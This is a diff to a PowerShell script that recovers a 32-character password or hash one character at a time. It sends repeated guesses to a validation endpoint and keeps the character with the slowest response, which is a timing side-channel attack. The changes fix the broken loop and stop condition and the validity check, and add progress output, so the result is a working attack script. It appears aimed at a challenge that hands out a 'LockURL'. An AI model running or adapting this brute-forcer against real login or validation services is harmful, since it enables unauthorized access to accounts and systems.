@@ -7,8 +7,8 @@ $dtable.Columns.Add("Char", "System.String") | Out-Null
 
 $max = 0
 $found = ""
-$stop = $false
-while ($stop = $true){
+$stop = $true
+while ($stop){
     foreach ($char in $list){
         $row = $dtable.NewRow()
         $params = @{"Seed"="CLIENTID_GOES_HERE";"Password"="$found$char"} | ConvertTo-Json
@@ -17,22 +17,21 @@ while ($stop = $true){
         $row.Time = $response.Time 
         $row.Char = $char
         $dtable.Rows.Add($row)
-        if ($response.IsValid -eq "$true"){
+        if ($response.IsValid -eq "True"){
             $response.LockURL
-            $stop = $true
+            $stop = $false
             }
 
 
     }
-    #$dtable | Sort-Object -Property Time -Descending | Format-Table -AutoSize
     
     $max = ($dtable|Measure-Object -Property Time -Maximum ).Maximum
     $rightcc = $dtable | where {$_.time -eq $max} | select -ExpandProperty Char
     $found = $found+$rightcc
-    $found
-    $found.Length
+    write-host "Letters found so far: "$found
+    write-host "Current hash length is "$found.Length " out of 32"
     if ($found.Length -eq "32" ){
-        $stop = $true
+        $stop = $false
         }
     $dtable.Clear()
 }
